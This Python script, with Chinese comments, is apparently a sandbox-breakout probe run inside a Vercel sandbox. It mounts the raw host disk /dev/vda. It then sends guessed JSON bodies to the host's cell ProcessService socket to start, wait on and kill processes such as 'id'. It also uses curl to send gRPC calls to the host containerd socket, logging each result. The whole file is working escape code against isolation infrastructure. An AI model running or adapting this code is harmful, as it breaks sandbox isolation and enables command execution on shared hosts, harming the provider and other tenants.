# -*- coding: utf-8 -*-
"""vda14_proc_start: ProcessService/Start 字段枚举 + curl http2 能力检查
1) ProcessService/Start: command/argv/cmdline 字段变体 (JSON)
2) ProcessService/Kill + Wait (hvcp_ id 格式探索)
3) curl 版本 + unix socket http2 支持测试 (Exec/StreamOutput via grpc)
输出落盘 + 哨兵 V14A_DONE"""
import os, time, socket, ctypes, re, subprocess

OUT = '/vercel/sandbox/v14a.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # P1: ProcessService/Start 字段枚举
    log('=== P1 Process/Start fields ===')
    bodies = [
        '{"command":"id"}',
        '{"command":"/bin/id"}',
        '{"command":"/bin/sh -c id"}',
        '{"cmd":"id"}',
        '{"argv":"id"}',
        '{"command":"id","workdir":"/tmp"}',
        '{"command":"id","env":{"A":"1"}}',
        '{"process_id":"hvcp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}',
        '{"process_id":"hvcp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","command":"id"}',
    ]
    for body in bodies:
        st, bd = rpc_unix(sp, PSVC + '/Start', body, t=5)
        log('start %-80s -> %s | %s' % (body, st, bd[:250].replace('\n', ' ')))
        time.sleep(0.3)

    # P2: Wait/Kill 格式探索
    log('=== P2 Wait/Kill ===')
    for m in ['Wait', 'Kill']:
        for pid in ['hvcp_' + 'a' * 32, 'hvcp_' + 'b' * 32, 'a' * 32]:
            body = '{"process_id":"%s"}' % pid
            st, bd = rpc_unix(sp, PSVC + '/' + m, body, t=4)
            log('%s %-50s -> %s | %s' % (m, pid, st, bd[:200].replace('\n', ' ')))
            time.sleep(0.3)

    # P3: curl http2 unix socket
    log('=== P3 curl http2 ===')
    r = subprocess.run(['curl', '--version'], capture_output=True, timeout=10)
    log('curl ver: %s' % r.stdout.decode(errors='replace').splitlines()[0])
    CSP = '/mnt/vdax/run/containerd/containerd.sock'
    open('/tmp/grpc_empty.bin', 'wb').write(b'\x00\x00\x00\x00\x00')
    for args in [['curl', '-v', '--http2', '--max-time', '8', '--unix-socket', CSP,
                  '-H', 'content-type: application/grpc', '--data-binary', '@/tmp/grpc_empty.bin',
                  'http://localhost/containerd.services.containerd.v1.Version/Version'],
                 ['curl', '-v', '--http2-prior-knowledge', '--max-time', '8', '--unix-socket', CSP,
                  '-H', 'content-type: application/grpc', '--data-binary', '@/tmp/grpc_empty.bin',
                  'http://localhost/containerd.services.containerd.v1.Version/Version']]:
        r = subprocess.run(args, capture_output=True, timeout=12)
        log('curl rc=%d out=%r err=%r' % (r.returncode, r.stdout[:200], r.stderr[-300:]))

    log('V14A_DONE')
    f.close()


if __name__ == '__main__':
    main()
